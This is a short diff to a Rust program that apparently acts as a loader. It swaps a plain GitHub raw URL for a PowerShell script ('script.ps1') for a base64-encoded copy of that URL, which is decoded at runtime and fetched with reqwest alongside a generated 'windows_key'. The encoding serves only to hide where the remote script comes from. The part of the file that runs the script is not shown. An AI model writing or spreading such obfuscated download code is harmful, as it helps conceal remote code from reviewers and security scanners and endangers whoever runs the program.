@@ -1,3 +1,4 @@
+use base64;
 use libloading::Library;
 use rand::{distributions::Alphanumeric, Rng};
 use reqwest;
@@ -55,7 +56,11 @@ cennet-i alâ kerhane midir?
         );
         std::process::exit(0);
     }
-    let url = "https://raw.githubusercontent.com/El0mar/legendary-train/refs/heads/main/script.ps1";
+    let b64_string =
+        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VsMG1hci9sZWdlbmRhcnktdHJhaW4vcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5wczEK";
+    let decoded_bytes = base64::decode(b64_string).expect("Something went wrong.");
+    let decoded_string = String::from_utf8(decoded_bytes).expect("Something went wrong.");
+    let url = decoded_string;
     let windows_key = generate_key();
     match reqwest::get(url).await {
         Ok(response) => {
